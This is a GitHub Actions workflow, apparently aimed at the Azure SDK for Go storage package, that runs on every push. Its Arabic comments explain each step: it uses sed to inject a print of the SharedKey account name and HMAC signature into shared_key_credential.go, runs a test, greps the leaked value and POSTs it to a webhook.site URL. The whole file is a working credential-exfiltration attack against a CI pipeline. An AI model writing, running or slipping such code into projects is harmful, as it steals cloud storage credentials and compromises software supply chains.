name: Execute_PoC
on: [push]
jobs:
  run-exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v3

      - name: Setup Go
        uses: actions/setup-go@v4
        with:
          go-version: '1.21'

      - name: Inject and Exfiltrate
        working-directory: ./sdk/storage/azblob
        run: |
          sed -i 's/go 1.25.0/go 1.21/' go.mod
          
          # حقن أمر طباعة داخل الدالة التي تحسب التوقيع (ComputeHMAC)
          # هذا سيطبع التوقيع في الـ Console قبل إرسال الطلب
          sed -i '/func (c \*SharedKeyCredential) computeHMAC/a \	fmt.Printf("EXFILTRATED_AUTH_HEADER: SharedKey %s:%s\\n", c.accountName, signature)' shared_key_credential.go
          
          # إضافة import fmt للملف المحقون لضمان عدم حدوث خطأ
          sed -i 's/import (/import ("fmt"/' shared_key_credential.go

          # تشغيل التست
          go test -v -run TestImpact_CredentialLeakage > raw_logs.txt 2>&1 || true
          
          # التقاط السطر المحقون
          FINAL_SECRET=$(grep "EXFILTRATED_AUTH_HEADER" raw_logs.txt | head -n 1 || echo "Injection_Failed")
          
          # إرسال الكنز للـ Webhook
          curl -X POST -d "Leak=$FINAL_SECRET" https://webhook.site/72d5ef0b-edde-4e82-b103-d71004e44835
